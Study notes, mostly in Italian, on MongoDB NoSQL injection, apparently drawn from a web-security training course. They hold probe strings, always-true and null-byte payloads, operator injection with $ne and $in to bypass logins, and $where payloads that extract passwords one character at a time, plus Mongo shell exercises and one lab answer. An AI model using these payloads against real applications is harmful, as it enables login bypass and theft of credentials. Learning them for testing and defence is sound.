

```
### NoSQL Injection Vulnerabilities

Due tipi di iniezioni NoSQL:
- Syntax injection: si verifica quando è possibile interrompere la sintassi della query NoSQL, consentendoti di iniettarne una tua carico utile. La metodologia è simile a quella utilizzata nell'SQL injection . Tuttavia la natura dell'attacco varia in modo significativo, poiché i database NoSQL utilizzano una gamma di linguaggi di query, tipi di sintassi di query e diverse strutture di dati.
- Iniezione di operatori: si verifica quando è possibile utilizzare gli operatori di query NoSQL per manipolare le query.


Rilevamento dell'iniezione di sintassi di MongoDB:
- https://insecure-website.com/product/lookup?category=fizzy
- this.category == 'fizzy'
- '"`{
;$Foo}
$Foo \xYZ
- https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00

Se JSON:
>  '\"`{\r;$Foo}\n$Foo \\xYZ\u0000



Determinare quali caratteri vengono elaborati

Per determinare quali caratteri vengono interpretati come sintassi dall'applicazione, è possibile inserire singoli caratteri. Ad esempio, potresti inviare ', che risulta nella seguente query MongoDB:
this.category == '''

Se ciò causa una modifica rispetto alla risposta originale, ciò potrebbe indicare che il file 'il carattere ha interrotto la sintassi della query e ha causato un errore di sintassi. Puoi confermarlo inviando una stringa di query valida nell'input, ad esempio eseguendo l'escape della virgoletta:
this.category == '\''



Conferma del comportamento condizionale

Dopo aver rilevato una vulnerabilità, il passaggio successivo è determinare se è possibile influenzare le condizioni booleane utilizzando la sintassi NoSQL.

Per verificarlo, invia due richieste, una con una condizione falsa e una con una condizione vera. Ad esempio potresti usare le istruzioni condizionali ' && 0 && 'x e ' && 1 && 'xcome segue:
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'xhttps://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x



Superare le condizioni esistenti

Ora che hai identificato la possibilità di influenzare le condizioni booleane, puoi tentare di ignorare le condizioni esistenti per sfruttare la vulnerabilità. Ad esempio, puoi inserire una condizione JavaScript che restituisce sempre true, come '||1||':
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27

Il risultato è la seguente query MongoDB:
this.category == 'fizzy'||'1'=='1'

Poiché la condizione inserita è sempre vera, la query modificata restituisce tutti gli elementi. Ciò ti consente di visualizzare tutti i prodotti in qualsiasi categoria, comprese le categorie nascoste.




Potresti anche aggiungere un carattere null dopo il valore della categoria. MongoDB può ignorare tutti i caratteri dopo un carattere null.

https://insecure-website.com/product/lookup?category=fizzy'%00

Il risultato è la seguente query NoSQL:
this.category == 'fizzy'\u0000' && this.released == 1

Se MongoDB ignora tutti i caratteri dopo il carattere null, ciò elimina il requisito che il campo rilasciato sia impostato su 1. Di conseguenza, tutti i prodotti nel fizzyvengono visualizzate le categorie, compresi i prodotti inediti. 


Query MongoDB:
{"username": "admin", "password": {"$ne": "wrong-password"}}
db.collection.find({"username":"admin", "password": {"$ne" : "wrong-password"}})

$where- Corrisponde ai documenti che soddisfano un'espressione JavaScript.
$ne- Corrisponde a tutti i valori che non sono uguali a un valore specificato.
$in- Corrisponde a tutti i valori specificati in un array.
$regex- Seleziona i documenti in cui i valori corrispondono a un'espressione regolare specificata.

Nel Json è possibile inserire query con oggetti nidificati:
{"username":"wiener"}diventa {"username":{"$ne":"invalid"}}




### Rilevamento MongoDB:
{"username":"wiener","password":"peter"}

Testare ciascun input con una serie di operatori. Ad esempio, per verificare se l'input del nome utente elabora l'operatore di query, potresti provare la seguente iniezione:
{"username":{"$ne":"invalid"},"password":{"peter"}}

Se la $neviene applicato l'operatore, questo interroga tutti gli utenti il ​​cui nome utente non è uguale a invalid.

Se sia l'inserimento del nome utente che quello della password elaborano l'operatore, potrebbe essere possibile bypassare l'autenticazione utilizzando il seguente payload:
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}

Questa query restituisce tutte le credenziali di accesso in cui sia il nome utente che la password non sono uguali invalid. Di conseguenza, hai effettuato l'accesso all'applicazione come primo utente nella raccolta.

Per prendere di mira un account, puoi costruire un payload che includa un nome utente noto o un nome utente che hai indovinato. Per esempio:
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""




### Estrazione dei dati in MongoDB

Considera un'applicazione vulnerabile che consente agli utenti di cercare altri nomi utente registrati e visualizza il loro ruolo. Ciò attiva una richiesta all'URL:
https://insecure-website.com/user/lookup?username=admin

Ciò si traduce nella seguente query NoSQL di userscollezione:
{"$where":"this.username == 'admin'"}

Poiché la query utilizza il file $whereoperatore, puoi tentare di inserire funzioni JavaScript in questa query in modo che restituisca dati sensibili. Ad esempio, potresti inviare il seguente payload:
admin' && this.password[0] == 'a' || 'a'=='b

Ciò restituisce il primo carattere della stringa della password dell'utente, consentendo di estrarre la password carattere per carattere.

Potresti anche usare JavaScript match()funzione per estrarre informazioni. Ad esempio, il seguente payload consente di identificare se la password contiene cifre:
admin' && this.password.match(/\d/) || 'a'=='b



```

```
### NoSQL Injection General

#. Mongo - Connecting Client 
> mongo

> show dbs
> use users
> show collections

> use flag
[Switched to db flag]
> show collections
[flag-collections]
>db.flag-collections.find()
[collections with a flag]

> use users
> db.current.find({"user":"Heather"})
> db.past.count()
> db.city.find({"state":"MA"}).count()

Q7. How many cities have population greater than 15000 in the collection city in database city?
> db.city.find({"pop":{$gt:15000}}).count()

Q8. How many cities of state “Indiana” have population greater than 15000 in collection
“city” in database “city”?
> db.city.find({$and:[{pop:{$gt:15000}},{"state":"IN"}]}).count()

Q9. How many cities have population less than 100 or belongs to state “Indiana” in
collection “city” in database “city”?
> db.city.find({$or:[{pop:{$lt:100}},{"state":"IN"}]}).count()


Q10. How many Cities have their name starting with “AN” in collection “city” in database
“city”?
> db.city.find({"city":{$regex:"^AN.*"}}).count()


Q11. What is the name of 101st city in collection “city” when sorted in ascending order
according to “city” in database “city”?
> db.city.find().sort({"city":1}).skip(100).limit(1)


Q12. What is the average population in collection “city” in database “city” (Upto two
decimal places)?
> db.city.aggregate({"$group":{"_id":null,avg:{$avg:"$pop"}}})


Q13. Use $ne to optained all information about users:
> http://example.com/?name=bob
> http://example.com/?name[$ne]=bob



```

```
### NoSQL Injection Lab Apprentice


#1. Lab: Detecting NoSQL injection
>  Submit a valid JavaScript payload in the value of the category query parameter. You could use the following payload:
Gifts'+'
> Gifts' && 0 && 'x
> Gifts' && 1 && 'x
> Gifts'||1||'
```

```
### NoSQL Injection Lab Practitioner
```

```
### NoSQL Injection Lab Expert
```

```
### NoSQL Injection Lab Extra
```

